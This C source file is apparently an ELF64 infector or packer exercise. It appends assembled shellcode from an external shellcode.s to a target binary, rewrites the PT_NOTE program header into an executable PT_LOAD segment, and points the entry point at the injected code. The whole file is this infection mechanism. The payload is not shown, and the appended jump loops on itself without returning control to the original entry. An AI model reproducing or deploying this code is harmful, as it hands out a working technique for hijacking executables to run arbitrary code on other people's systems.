#include <elf.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct  s_file {
  size_t      size;
  Elf64_Ehdr  *header;
}               t_file;

static t_file patchShellcode(t_file shellcode) {
  char  ins[] = {0xe9, 0xfb, 0xff, 0xff, 0xff};
  char  *header;

  header = mmap(NULL, shellcode.size + 5, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
  memcpy(header, shellcode.header, shellcode.size);
  memcpy(header + shellcode.size, ins, 5);
  munmap(shellcode.header, shellcode.size);
  shellcode.size += 5;
  shellcode.header = (Elf64_Ehdr *)header;
  return (shellcode);
}

static t_file getShellcode(void) {
  int         fd;
  struct stat stats;
  t_file      shellcode;

  system("nasm -o shellcode shellcode.s");
  stat("shellcode", &stats);
  shellcode.size = stats.st_size;
  fd = open("shellcode", O_RDONLY);
  shellcode.header = mmap(NULL, shellcode.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
  close(fd);
  return (patchShellcode(shellcode));
}

static int  appendShellcode(t_file *bin, t_file shellcode) {
  t_file  new;

  new.size = bin->size + shellcode.size;
  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
    return (-1);
  memcpy(new.header, bin->header, bin->size);
  memcpy(((void *)new.header) + bin->size, shellcode.header, shellcode.size);
  munmap(bin->header, bin->size);
  bin->header = new.header;
  bin->size = new.size;
  return (0);
}

static int  makeNew(t_file *bin) {
  Elf64_Phdr  *segment;
  t_file      shellcode;

  shellcode = getShellcode();
  if (appendShellcode(bin, shellcode) == -1)
    return (-1);
  segment = ((void *)bin->header) + bin->header->e_phoff;
  while (segment->p_type != PT_NOTE) {
    segment = ((void *)segment) + sizeof(Elf64_Phdr);
  }
  segment->p_flags = PF_R | PF_X;
  segment->p_type = PT_LOAD;
  segment->p_offset = bin->size - shellcode.size;
  segment->p_vaddr = 0xc000000 + bin->size - shellcode.size;
  segment->p_paddr = bin->size - shellcode.size;
  segment->p_filesz = shellcode.size;
  segment->p_memsz = shellcode.size;
  bin->header->e_entry = 0xc000000 + bin->size - shellcode.size;
  /* segment->p_align = 0x1000; */
  munmap(shellcode.header, shellcode.size);
  return (0);
}

int   main(int argc, char **argv) {
  int         fd;
  t_file      bin;
  struct stat stats;

  if (argc != 2) {
    dprintf(2, "You should pass an arg\n");
    return (1);
  }
  fd = open(argv[1], O_RDONLY);
  stat(argv[1], &stats);
  bin.size = stats.st_size;
  if ((bin.header = mmap(NULL, bin.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    return (1);
  close(fd);
  if (makeNew(&bin) == -1)
    dprintf(2, "EEEERRRRRRRRROOR\n");
  fd = open("yo", O_CREAT | O_TRUNC | O_WRONLY, S_IRWXU);
  write(fd, bin.header, bin.size);
  close(fd);
  dprintf(2, "Entry point:  %p\n", NULL + bin.header->e_entry);
  munmap(bin.header, bin.size);
  dprintf(1, "Done !\n");
  return (0);
}
